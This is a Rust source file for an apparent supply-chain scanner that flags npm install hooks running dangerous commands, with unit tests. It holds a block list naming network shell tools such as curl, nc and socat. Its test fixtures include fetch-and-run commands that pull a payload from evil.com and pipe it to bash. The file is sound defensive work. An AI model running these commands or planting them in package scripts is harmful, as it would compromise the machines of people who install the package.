use doria_types::{Finding, FindingKind, Location, Severity};
use swc_core::ecma::ast::*;
use swc_core::ecma::visit::{Visit, VisitWith};

/// Hook names in package.json scripts that execute at install time
const INSTALL_HOOKS: &[&str] = &["preinstall", "postinstall", "install", "prepare", "prepack"];

/// Dangerous commands that should never appear in install hooks
const DANGEROUS_COMMANDS: &[&str] = &[
    "curl", "wget", "bash", "sh", "python", "python3", "node -e", "eval", "chmod",
    "nc ", // netcat
    "ncat", "socat",
];

pub struct HooksDetector {
    pub findings: Vec<Finding>,
    pub file: String,
    pub package_name: String,
    pub package_version: String,
}

impl HooksDetector {
    pub fn new(file: String, package_name: String, package_version: String) -> Self {
        Self {
            findings: Vec::new(),
            file,
            package_name,
            package_version,
        }
    }

    fn add_finding(
        &mut self,
        line: u32,
        description: String,
        evidence: Option<String>,
        confidence: f32,
    ) {
        self.findings.push(Finding {
            id: format!("doria-hook-{:03}", self.findings.len() + 1),
            kind: FindingKind::InstallHook,
            severity: Severity::Critical,
            package_name: self.package_name.clone(),
            package_version: self.package_version.clone(),
            description,
            location: Some(Location {
                file: self.file.clone(),
                line,
                column: 0,
            }),
            evidence,
            confidence,
            slopsquatting: None,
        });
    }

    /// Check if a script string contains dangerous commands
    fn check_script_content(&mut self, script: &str, hook_name: &str, line: u32) {
        for cmd in DANGEROUS_COMMANDS {
            if script.contains(cmd) {
                self.add_finding(
                    line,
                    format!("Dangerous command '{}' found in '{}' hook", cmd, hook_name),
                    Some(script.to_string()),
                    0.92,
                );
                return;
            }
        }

        // Even without a dangerous command, any install hook is worth flagging
        // at lower confidence — legitimate hooks exist (node-gyp, etc.)
        self.add_finding(
            line,
            format!("Install hook '{}' detected — review manually", hook_name),
            Some(script.to_string()),
            0.50,
        );
    }
}

impl Visit for HooksDetector {
    /// Scan for scripts object in package.json parsed as JS
    /// Also catches runtime hook registration patterns in JS files
    fn visit_key_value_prop(&mut self, prop: &KeyValueProp) {
        if let PropName::Str(key) = &prop.key {
            let key_name = key.value.as_ref();

            if INSTALL_HOOKS.contains(&key_name) {
                // The value should be a string (the script command)
                if let Expr::Lit(Lit::Str(script)) = prop.value.as_ref() {
                    self.check_script_content(script.value.as_ref(), key_name, key.span.lo.0);
                }
            }
        }

        prop.visit_children_with(self);
    }

    /// Also catch string assignments like:
    /// npm.config.set('postinstall', 'curl ...')
    fn visit_call_expr(&mut self, call: &CallExpr) {
        if let Callee::Expr(expr) = &call.callee {
            if let Expr::Member(member) = expr.as_ref() {
                if let MemberProp::Ident(prop) = &member.prop {
                    if prop.sym.as_ref() == "set" {
                        // Check if first arg is a hook name
                        if let Some(first) = call.args.first() {
                            if let Expr::Lit(Lit::Str(s)) = first.expr.as_ref() {
                                if INSTALL_HOOKS.contains(&s.value.as_ref()) {
                                    // Second arg is the script
                                    if let Some(second) = call.args.get(1) {
                                        if let Expr::Lit(Lit::Str(script)) = second.expr.as_ref() {
                                            self.check_script_content(
                                                script.value.as_ref(),
                                                s.value.as_ref(),
                                                call.span.lo.0,
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        call.visit_children_with(self);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::rc::Rc;
    use swc_core::common::{FileName, SourceMap};
    use swc_core::ecma::parser::{lexer::Lexer, Parser, StringInput, Syntax};

    fn detect_in_js(code: &str) -> Vec<Finding> {
        let cm = Rc::new(SourceMap::default());
        let fm = cm.new_source_file(FileName::Anon, code.to_string());
        let lexer = Lexer::new(
            Syntax::Es(Default::default()),
            Default::default(),
            StringInput::from(&*fm),
            None,
        );
        let mut parser = Parser::new_from(lexer);
        let module = parser.parse_module().expect("failed to parse");

        let mut detector = HooksDetector::new(
            "test.js".to_string(),
            "test-pkg".to_string(),
            "1.0.0".to_string(),
        );
        detector.visit_module(&module);
        detector.findings
    }

    #[test]
    fn test_detects_postinstall_curl() {
        let code = r#"
            const scripts = {
                "postinstall": "curl http://evil.com/payload | bash"
            };
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
        assert_eq!(findings[0].kind, FindingKind::InstallHook);
        assert!(findings[0].confidence > 0.90);
    }

    #[test]
    fn test_detects_preinstall_wget() {
        let code = r#"
            const scripts = {
                "preinstall": "wget http://evil.com/malware -O /tmp/m && bash /tmp/m"
            };
        "#;
        let findings = detect_in_js(code);
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_flags_clean_hook_at_low_confidence() {
        // node-gyp rebuild is a legitimate postinstall hook
        let code = r#"
            const scripts = {
                "postinstall": "node-gyp rebuild"
            };
        "#;
        let findings = detect_in_js(code);
        // Should still flag it but at low confidence
        assert!(!findings.is_empty());
        assert!(findings[0].confidence <= 0.50);
    }

    #[test]
    fn test_clean_code_passes() {
        let code = r#"
            const x = 1 + 1;
            console.log(x);
        "#;
        let findings = detect_in_js(code);
        assert!(findings.is_empty());
    }
}
